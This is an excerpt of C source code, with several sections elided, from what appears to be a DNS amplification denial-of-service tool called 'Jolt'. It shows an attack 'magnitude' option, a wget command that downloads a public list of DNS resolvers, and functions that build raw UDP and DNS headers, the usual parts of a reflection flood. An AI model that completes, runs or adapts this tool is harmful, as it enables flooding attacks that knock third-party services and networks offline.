...
char *g_wget[] = {"/bin/wget", "-O", "/tmp/resolv.txt", "https://public-dns.info/nameservers.txt", NULL};
...
bool insert_udp_header(uint8_t **buf, size_t *buflen, PSEUDOHDR *phdr, const uint8_t *data, size_t ulen,
                       uint16_t sport);
...
typedef struct JoltOptions
{
    ...
    uint16_t magnitude;         // Magnitude of the attack
    char resolv_path[PATH_MAX]; // Path to the resolver list
    bool debug_mode;            // Debug mode flag
    bool hex_mode;              // Hex dump mode flag
    bool file_read_mode;        // Flag to read from a specified file rather than downloading
} JoltOptions;

Result_T do_init(JoltOptions *opts, int argc, char **argv);

Result_T do_init(JoltOptions *opts, int argc, const char **argv)
{
    ...
    do
    {
        ...
        case 'm':
            errno = 0;
            opts->magnitude = (uint16_t)strtol(optarg, &endptr, 0);
            if (errno != 0 || endptr == optarg || *endptr != '\0')
...
bool insert_dns_header(uint8_t **buf, size_t *buflen)
{
    ...
    third_byte = (DNS_RD_J0LT | DNS_TC_J0LT << 1 | DNS_AA_J0LT << 2 | DNS_OPCODE_J0LT << 3 | DNS_QR_J0LT << 7);

    fourth_byte = (DNS_RCODE_J0LT | DNS_CD_J0LT << 4 | DNS_AD_J0LT << 5 | DNS_Z_J0LT << 6 | DNS_RA_J0LT << 7);
